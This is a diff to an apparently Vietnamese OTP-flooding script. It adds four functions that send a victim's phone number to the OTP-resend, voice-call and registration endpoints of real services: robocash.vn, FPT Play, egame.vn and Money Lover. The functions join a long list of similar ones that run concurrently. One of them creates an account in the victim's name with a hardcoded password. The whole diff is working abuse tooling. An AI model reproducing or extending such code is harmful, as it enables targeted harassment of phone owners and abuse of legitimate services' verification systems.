@@ -3558,6 +3558,105 @@ def appota():
     except requests.exceptions.RequestException:
         print("APPOTA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
+def robocash_call():
+    headers = {
+        'Host': 'robocash.vn',
+        'accept': '*/*',
+        'x-requested-with': 'XMLHttpRequest',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'origin': 'https://robocash.vn',
+        'referer': 'https://robocash.vn/',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    }
+
+    data = {
+        'phone': sdt,
+        'login_type': '2',
+    }
+
+    try:
+        response = requests.post('https://robocash.vn/register/phone-resend', headers=headers, data=data)
+        response.raise_for_status()
+        print("ROBOCASH CALL | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("ROBOCASH CALL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def fptpay_call():
+    headers = {
+        'Host': 'api.fptplay.net',
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'x-requested-with': 'XMLHttpRequest',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0',
+        'content-type': 'application/json',
+        'origin': 'https://fptplay.vn',
+        'referer': 'https://fptplay.vn/',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    }
+
+    json_data = {
+        'phone': sdt,
+        'country_code': 'VN',
+        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
+    }
+
+    try:
+        response = requests.post('https://api.fptplay.net/api/v7.1_w/user/otp/voice_call?st=Eim9hpobCZPoIoVVokkIDA&e=1736436123&device=Chrome(Win)&drm=1', headers=headers, json=json_data)
+        response.raise_for_status()
+        print("FPTPLAY CALL | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("FPTPLAY CALL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def egame_call():
+    headers = {
+        'Host': 'egame.vn',
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'x-requested-with': 'XMLHttpRequest',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'origin': 'https://egame.vn',
+        'referer': 'https://egame.vn/signup',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    }
+
+    data = {
+        'phone': sdt,
+        'type': '3',
+    }
+
+    try:
+        response = requests.post('https://egame.vn/api/auth/authentication/resend-otp', headers=headers, data=data)
+        response.raise_for_status()
+        print("EGAME CALL | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("EGAME CALL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def moneylover_call():
+    headers = {
+        'Host': 'app.moneylover.me',
+        'accept': 'application/json, text/plain, */*',
+        'content-type': 'application/json;charset=UTF-8',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0',
+        'origin': 'https://web.moneylover.me',
+        'referer': 'https://web.moneylover.me/',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    }
+
+    json_data = {
+        'password': '123456789aA@',
+        'phoneNumber': sdt,
+        'phoneNumberWithoutCode': sdt[1:],
+        'shortCode': '84',
+        'verifyMethod': 'voice',
+    }
+
+    try:
+        response = requests.post('https://app.moneylover.me/api/user/register', headers=headers, json=json_data)
+        response.raise_for_status()
+        print("MONEYLOVER CALL | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("MONEYLOVER CALL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
 functions = [
     tv360, vieon, myviettel, fptshop, befood, foodhubzl,
     vttelecom, vinwonders, hasaki, fahasa, medigozl,
@@ -3577,7 +3676,8 @@ functions = [
     kanow, butlsms, butlzl, ilokafood, vieclam24h,
     sobanhangzl, sobanhang, sfin, sapo,
     truedoc, upos, ghephang, hoatoc247, gotp,
-    vamo, kfc, beaxy, loship, vayvnd, pizzahut, cake, vinid, appota
+    vamo, kfc, beaxy, loship, vayvnd, pizzahut, cake, vinid, appota,
+    robocash_call, fptpay_call, egame_call, moneylover_call
 ]
 
 with concurrent.futures.ThreadPoolExecutor() as executor:
